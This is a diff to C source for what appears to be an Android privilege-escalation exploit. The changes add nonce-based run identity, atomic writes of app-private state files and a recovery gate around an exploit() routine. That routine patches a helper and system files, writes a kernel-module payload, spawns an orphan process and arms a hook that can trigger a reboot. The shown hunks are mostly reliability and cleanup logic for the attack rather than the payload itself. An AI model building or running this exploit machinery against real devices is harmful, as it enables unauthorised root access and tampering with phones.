@@ -29,10 +29,14 @@
 #define DF_FILES_DIR   "/data/user_de/0/df.root/files"
 #define DF_NONCE_PATH  DF_FILES_DIR "/dfinv"
 #define DF_NONCE_TMP   DF_FILES_DIR "/dfinv.tmp"
-#define DF_NONCE_MODE  0644
+#define DF_BOOTFAIL_PATH DF_FILES_DIR "/dfbootfail"
+#define DF_BOOTFAIL_TMP  DF_FILES_DIR "/dfbootfail.tmp"
+#define DF_RECOVER_PATH  DF_FILES_DIR "/dfrecover"
+#define DF_RECOVER_TMP   DF_FILES_DIR "/dfrecover.tmp"
+#define DF_STATE_MODE  0644
 /* Budget bounds a wait with no preflight; a REBOOT_PENDING preflight may use a
  * grace window past that budget, but never past the overall cap. Cleanup runs
- * once before this extended wait. */
+ * once AFTER the first bound status observation, on that same deadline. */
 #define DF_WAIT_BUDGET_MS  70000
 #define DF_WAIT_GRACE_MS   10000
 #define DF_WAIT_OVERALL_MS 85000
@@ -952,56 +956,125 @@ static int generate_nonce(char out[DF_NONCE_CHARS + 1])
     return df_nonce_is_valid(out) ? 0 : -1;
 }
 
-/* Atomic replace: unlink any stale temp, O_EXCL|O_NOFOLLOW create, pin 0644
- * with fchmod, fsync the inode, rename over dfinv. A partial write never
- * becomes visible to bootstrap. */
-static int write_nonce_atomic(const char *nonce)
+/* Atomic replace for app-owned state: unlink any stale temp, O_EXCL|O_NOFOLLOW
+ * create, pin 0644 with fchmod, fsync the inode, rename over the final path.
+ * A partial write never becomes visible to bootstrap. len == 0 deliberately
+ * publishes an empty file (used to clear a stale bootfail channel). */
+static int write_atomic(const char *path, const char *tmp_path,
+                        const char *data, size_t len)
 {
     size_t off = 0;
     int fd, dfd;
 
-    unlink(DF_NONCE_TMP);
-    fd = open(DF_NONCE_TMP, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW | O_CLOEXEC,
-              DF_NONCE_MODE);
+    if (!path || !tmp_path || !data) return -1;
+    unlink(tmp_path);
+    fd = open(tmp_path, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW | O_CLOEXEC,
+              DF_STATE_MODE);
     if (fd < 0) {
-        printf("nonce: create %s failed: %s\n", DF_NONCE_TMP, strerror(errno));
+        printf("state: create %s failed: %s\n", tmp_path, strerror(errno));
         return -1;
     }
-    if (fchmod(fd, DF_NONCE_MODE) < 0) {
-        printf("nonce: fchmod failed: %s\n", strerror(errno));
+    if (fchmod(fd, DF_STATE_MODE) < 0) {
+        printf("state: fchmod failed: %s\n", strerror(errno));
         close(fd);
-        unlink(DF_NONCE_TMP);
+        unlink(tmp_path);
         return -1;
     }
-    while (off < DF_NONCE_CHARS) {
-        ssize_t n = write(fd, nonce + off, DF_NONCE_CHARS - off);
+    while (off < len) {
+        ssize_t n = write(fd, data + off, len - off);
         if (n < 0 && errno == EINTR) continue;
         if (n <= 0) {
-            printf("nonce: write failed: %s\n", strerror(errno));
+            printf("state: write failed: %s\n", strerror(errno));
             close(fd);
-            unlink(DF_NONCE_TMP);
+            unlink(tmp_path);
             return -1;
         }
         off += (size_t)n;
     }
     if (fsync(fd) < 0) {
-        printf("nonce: fsync failed: %s\n", strerror(errno));
+        printf("state: fsync failed: %s\n", strerror(errno));
         close(fd);
-        unlink(DF_NONCE_TMP);
+        unlink(tmp_path);
         return -1;
     }
     if (close(fd) < 0) {
-        unlink(DF_NONCE_TMP);
+        unlink(tmp_path);
         return -1;
     }
-    if (rename(DF_NONCE_TMP, DF_NONCE_PATH) < 0) {
-        printf("nonce: rename failed: %s\n", strerror(errno));
-        unlink(DF_NONCE_TMP);
+    if (rename(tmp_path, path) < 0) {
+        printf("state: rename failed: %s\n", strerror(errno));
+        unlink(tmp_path);
         return -1;
     }
     /* Best effort: make the rename durable as well as the file contents. */
     dfd = open(DF_FILES_DIR, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
     if (dfd >= 0) { fsync(dfd); close(dfd); }
+    return 0;
+}
+
+static int write_nonce_atomic(const char *nonce)
+{
+    if (!df_nonce_is_valid(nonce)) return -1;
+    return write_atomic(DF_NONCE_PATH, DF_NONCE_TMP, nonce, DF_NONCE_CHARS);
+}
+
+/* Clear any stale reserved-channel bootfail token from a prior invocation. */
+static int clear_bootfail(void)
+{
+    return write_atomic(DF_BOOTFAIL_PATH, DF_BOOTFAIL_TMP, "", 0);
+}
+
+/* Publish the restore-verification gate. Only the exact bytes "ok\n" open the
+ * reboot path; anything else (including failure to write) keeps it closed. */
+static int write_recovery_status(const char *status)
+{
+    if (!status) return -1;
+    return write_atomic(DF_RECOVER_PATH, DF_RECOVER_TMP, status, strlen(status));
+}
+
+/* An invocation identity is ambiguous when an existing /dev/dffinal token is
+ * not bound to the nonce we just generated, or when an app-private file could
+ * not be created/cleared. A nonce merely read from shared persistent state is
+ * NOT proof of identity, so in either case we refuse to arm the hook. */
+static int identity_is_ambiguous(const char *nonce, int app_state_ready)
+{
+    int fd;
+    struct stat st;
+    char buf[DF_FINAL_TOKEN_CAP];
+    size_t off = 0;
+    enum df_outcome o = DF_OUTCOME_NONE;
+
+    if (!app_state_ready || !df_nonce_is_valid(nonce)) {
+        printf("identity: app-private state unavailable; refusing to arm\n");
+        return 1;
+    }
+    fd = open(DF_FINAL_PATH, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
+    if (fd < 0) {
+        if (errno == ENOENT) return 0; /* no existing publisher: unambiguous */
+        printf("identity: /dev/dffinal unreadable; refusing to arm\n");
+        return 1;
+    }
+    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) ||
+        st.st_size <= 0 || st.st_size >= (off_t)sizeof(buf)) {
+        close(fd);
+        printf("identity: /dev/dffinal is not a bounded regular file; refusing to arm\n");
+        return 1;
+    }
+    while (off < (size_t)st.st_size) {
+        ssize_t n = read(fd, buf + off, (size_t)st.st_size - off);
+        if (n < 0 && errno == EINTR) continue;
+        if (n <= 0) {
+            close(fd);
+            printf("identity: short read of /dev/dffinal; refusing to arm\n");
+            return 1;
+        }
+        off += (size_t)n;
+    }
+    close(fd);
+    if (df_parse_final_token(buf, off, nonce, &o) != 0) {
+        printf("identity: existing /dev/dffinal is not bound to this run; refusing to arm\n");
+        return 1;
+    }
     return 0;
 }
 
@@ -1067,6 +1140,16 @@ static int exp_read_final(void *ctx, char *buf, size_t cap, size_t *out_len)
     return df_read_final_file(DF_FINAL_PATH, buf, cap, out_len);
 }
 
+/* Separate app-owned channel for a bootstrap failure observed before a run
+ * identity existed. Only a token with the RESERVED nonce and BOOTSTRAP_FAILED
+ * is accepted by the protocol; this adapter never touches /dev. */
+static int exp_read_bootstrap_failure(void *ctx, char *buf, size_t cap,
+                                      size_t *out_len)
+{
+    (void)ctx;
+    return df_read_final_file(DF_BOOTFAIL_PATH, buf, cap, out_len);
+}
+
 /* The consumer never publishes; these are fail-closed no-ops kept so the
  * injected vtable is complete. They are never called on the consumer path. */
 static int exp_publish_final(void *ctx, const char *nonce, enum df_outcome outcome)
@@ -1082,21 +1165,58 @@ static int exp_wait_child(void *ctx, int timeout_ms)
     (void)ctx; (void)timeout_ms; return -1;
 }
 
-static void status_cleanup_cb(void *ctx)
+/* Invoked exactly once by status_flow_run after the first bound observation.
+ * Returns 0 only when restore verification succeeded; a failed/unobservable
+ * recovery result keeps the producer's gate closed and sets the recovery bit
+ * on the final rc. */
+static int status_cleanup_cb(void *ctx)
 {
     struct preflight *pf = (struct preflight *)ctx;
-    if (!pf || pf->cleanup_done) return; /* exactly once, even on retries */
-    pf->cleanup_done = 1;
-    if (cleanup(pf) < 0) {
-        pf->cleanup_failed = 1;
-        printf("cleanup: one or more restores failed\n");
+    const char *status;
+
+    if (!pf) return -1;
+    if (!pf->cleanup_done) {
+        pf->cleanup_done = 1;
+        if (cleanup(pf) < 0) {
+            pf->cleanup_failed = 1;
+            printf("cleanup: one or more restores failed\n");
+        }
     }
+    status = pf->cleanup_failed ? "fail\n" : "ok\n";
+    if (write_recovery_status(status) != 0) {
+        /* A status we cannot publish is NOT a verified restore. */
+        pf->cleanup_failed = 1;
+    }
+    return pf->cleanup_failed ? -1 : 0;
 }
 
 static int exploit(struct preflight *pf) {
+    char nonce[DF_NONCE_CHARS + 1] = {0};
+    struct status_io io;
+    enum df_outcome outcome = DF_OUTCOME_NONE;
+    enum df_wait_result wait;
+    int cleanup_failed = 0;
+    int app_state_ready;
+    int rc = 3;
+
     printf("\n=== exploit (patching files) ===\n");
 
-    int rc = 3;
+    /* Establish the run identity BEFORE any patch, usleep or hook arming.
+     * Bootstrap binds its tokens to the nonce it reads from dfinv; a token
+     * already in /dev/dffinal with a different nonce, or an app-private file
+     * we cannot create/clear, makes this invocation ambiguous. In that case
+     * the hook is NOT armed and no reboot can be triggered. Recovery starts
+     * closed ("fail\n") and is only opened by verified cleanup. */
+    app_state_ready = (generate_nonce(nonce) == 0 &&
+                       write_nonce_atomic(nonce) == 0 &&
+                       clear_bootfail() == 0 &&
+                       write_recovery_status("fail\n") == 0);
+    if (!app_state_ready || identity_is_ambiguous(nonce, app_state_ready)) {
+        (void)write_recovery_status("fail\n"); /* best effort; gate stays closed */
+        printf("identity: ambiguous run; hook not armed, no reboot\n");
+        goto done;
+    }
+
     if (patch_helper(pf)) goto done;
     /* Helper must be patched before vendor reads; capture BEFORE the KO write
      * so the restore plan cannot be poisoned by our own payload. */
@@ -1108,49 +1228,37 @@ static int exploit(struct preflight *pf) {
     usleep(500000);
 
     printf("\n=== init  ===\n");
-    /* Bind the run before arming the hook: bootstrap refuses to publish (and
-     * refuses to reboot) if it cannot read this exact nonce from dfinv. */
-    {
-        char nonce[DF_NONCE_CHARS + 1];
-        if (generate_nonce(nonce) != 0 || write_nonce_atomic(nonce) != 0) {
-            printf("nonce: cannot persist run nonce; no reboot will be triggered\n");
-            rc = DF_RC_UNKNOWN;
-            goto done;
-        }
-        if (createOrphanProcess() != 0) {
-            rc = DF_RC_UNKNOWN;
-            goto done;
-        }
-
-        {
-            struct status_io io;
-            enum df_outcome outcome = DF_OUTCOME_NONE;
-            enum df_wait_result wait;
-
-            memset(&io, 0, sizeof(io));
-            io.now_ms          = exp_now_ms;
-            io.sleep_ms        = exp_sleep_ms;
-            io.read_final      = exp_read_final;
-            io.publish_final   = exp_publish_final;
-            io.late_load_state = exp_late_load_state;
-            io.wait_child      = exp_wait_child;
-            io.report          = exp_report;
-            io.nonce           = nonce;
-
-            /* 70 s budget covers the 60 s late-load wait plus slack. A
-             * REBOOT_PENDING preflight rebases a 10 s grace window that may run
-             * past the budget, but is capped at 85 s overall. status_flow_run
-             * releases the patched files EXACTLY ONCE before this extended
-             * wait; an unrefined pending is reported as ATTEMPT_UNKNOWN. */
-            wait = status_flow_run(&io, pf, DF_WAIT_BUDGET_MS, DF_WAIT_GRACE_MS,
-                                   DF_WAIT_OVERALL_MS, status_cleanup_cb, &outcome);
-            printf("status: %s (rc=%d)\n",
-                   wait == DONE ? "final status observed" :
-                   wait == TIMEOUT ? "timeout waiting for final status" : "status error",
-                   df_outcome_to_rc(outcome));
-            rc = df_outcome_to_rc(outcome);
-        }
+    if (createOrphanProcess() != 0) {
+        rc = DF_RC_UNKNOWN;
+        goto done;
     }
+
+    memset(&io, 0, sizeof(io));
+    io.now_ms          = exp_now_ms;
+    io.sleep_ms        = exp_sleep_ms;
+    io.read_final      = exp_read_final;
+    io.read_bootstrap_failure = exp_read_bootstrap_failure;
+    io.publish_final   = exp_publish_final;
+    io.late_load_state = exp_late_load_state;
+    io.wait_child      = exp_wait_child;
+    io.report          = exp_report;
+    io.nonce           = nonce;
+
+    /* 70 s budget covers the 60 s late-load wait plus slack. A REBOOT_PENDING
+     * preflight rebases a 10 s grace window past that budget, capped at 85 s
+     * overall. status_flow_run invokes the cleanup callback exactly once AFTER
+     * the first bound status observation (or at the deadline), charges that
+     * time to the same 85 s clock, and reports restore failure separately.
+     * No reboot command is claimed to have been issued before that point. */
+    wait = status_flow_run(&io, pf, DF_WAIT_BUDGET_MS, DF_WAIT_GRACE_MS,
+                           DF_WAIT_OVERALL_MS, status_cleanup_cb, &outcome,
+                           &cleanup_failed);
+    if (cleanup_failed) pf->cleanup_failed = 1;
+    printf("status: %s (rc=%d)\n",
+           wait == DONE ? "final status observed" :
+           wait == TIMEOUT ? "timeout waiting for final status" : "status error",
+           df_outcome_to_rc(outcome));
+    rc = df_outcome_to_rc(outcome);
     return rc;
 done:
     /* No bootstrap consumer was launched (patch, nonce or orphan failure), so
